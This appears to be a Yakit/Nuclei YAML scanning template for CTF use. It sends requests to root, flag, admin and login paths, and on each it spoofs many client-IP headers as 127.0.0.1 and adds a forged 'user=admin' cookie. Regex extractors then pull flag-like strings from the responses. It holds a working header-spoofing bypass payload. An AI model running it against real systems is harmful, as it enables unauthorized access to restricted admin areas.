content:
id: ctf-localhost-bypass-check

info:
  name: CTF本地访问绕过检测
  author: god
  severity: medium
  description: 检测是否存在通过伪造IP头实现本地访问绕过的漏洞，并在响应中查找flag
  reference:
    - https://github.com/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
    yakit-info:
      sign: 454db339fb19fcd2c5f1fd253c3ab620

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
      - "{{BaseURL}}/flag"
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/index.php"
    
    headers:
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
      Accept-Encoding: gzip, deflate
      Accept-Language: zh-CN,zh;q=0.9
      Cache-Control: max-age=0
      Connection: close
      Upgrade-Insecure-Requests: "1"
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
      Cookie: passport_sid=64f53e08c677b; passport_token=bAM46tpLgdrNDmLkjMeiMUYbZUfyNbiQsDwBj_2B0sbv0_2FYS591YLw7Ospzzl0xz_2Fv_2F3YPJg_3D_3D; wxlogin_isfreshen=1; user=admin
      
      # 多种本地IP头
      X-Forwarded-For: 127.0.0.1
      X-Real-IP: 127.0.0.1
      X-Client-IP: 127.0.0.1
      X-Remote-IP: 127.0.0.1
      X-Remote-Addr: 127.0.0.1
      X-Host: 127.0.0.1
      X-Originating-IP: 127.0.0.1
      X-Forwarded-Host: 127.0.0.1
      X-Forwarded-Proto: http
      X-Custom-IP-Authorization: 127.0.0.1
      X-Requested-With: XMLHttpRequest
      
      # 其他可能的本地IP头
      Client-IP: 127.0.0.1
      True-Client-IP: 127.0.0.1
      True-Client-Ip: 127.0.0.1
      Cf-Connecting-Ip: 127.0.0.1
      Fastly-Client-Ip: 127.0.0.1
      Proxy-Client-IP: 127.0.0.1
      WL-Proxy-Client-IP: 127.0.0.1
      Forwarded: for=127.0.0.1
      Forwarded-For: 127.0.0.1
      Ali-CDN-Real-IP: 127.0.0.1
      Cdn-Real-Ip: 127.0.0.1
      Cdn-Src-Ip: 127.0.0.1
      
      # 添加Referer头指向本地
      Referer: http://127.0.0.1/
      
      # 添加Origin头
      Origin: http://127.0.0.1

    max-redirects: 3
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          # 多种flag格式匹配
          - "flag{"
          - "flag:"
          - "flag="
          - "FLAG{"
          - "Flag{"
          - "ctf{"
          - "CTF{"
          - "key{"
          - "KEY{"
          # 可能的关键词
          - "congrat"
          - "success"
          - "admin"
          - "local"
          - "127.0.0.1"
          - "localhost"
          - "内网"
          - "本地"
        condition: or
        negative: false

      - type: word
        part: header
        words:
          - "flag"
          - "FLAG"
          - "Flag"
          - "ctf"
          - "CTF"
        condition: or
        negative: false

      - type: status
        status:
          - 200
          - 302
          - 403  # 有时403可能包含有用信息
          - 500  # 有时错误页面会泄露信息

      # 排除常见的错误页面
      - type: word
        part: body
        words:
          - "404 Not Found"
          - "Access Denied"
          - "Forbidden"
        condition: or
        negative: true

    extractors:
      - type: regex
        part: body
        regex:
          # 提取各种格式的flag
          - "flag{.*?}"
          - "FLAG{.*?}"
          - "Flag{.*?}"
          - "ctf{.*?}"
          - "CTF{.*?}"
          - "key{.*?}"
          - "KEY{.*?}"
          - "flag:.*?(\\w{10,})"
          - "flag=.*?(\\w{10,})"
          # 提取类似flag的字符串
          - "[Ff]lag[\\s\\-_:=\\[]+([a-fA-F0-9]{10,}|[\\w\\-]{10,})"
          # 提取CTF相关信息
          - "CTF[\\s\\-_:=\\[]+([a-fA-F0-9]{10,}|[\\w\\-]{10,})"
params: "[{\"Field\":\"target\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"扫描目标\",\"Help\":\"扫描目标可接受：主机名 / 主机名:端口 / IP段 / URL 等多种格式\",\"Required\":true},{\"Field\":\"reverse-url\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"反连 URL\",\"Help\":\"可使用 InteractshURL 也可使用 Yakit Reverse URL\"},{\"Field\":\"debug\",\"TypeVerbose\":\"boolean\",\"FieldVerbose\":\"设置调试模式\",\"Help\":\"开启调试模式，调试模式将输出尽量多的调试信息\"},{\"Field\":\"proxy\",\"TypeVerbose\":\"proxy\",\"FieldVerbose\":\"HTTP 代理\",\"Help\":\"设置 HTTP 代理\"}]"
help: 检测是否存在通过伪造IP头实现本地访问绕过的漏洞，并在响应中查找flag
author: 响应云安全
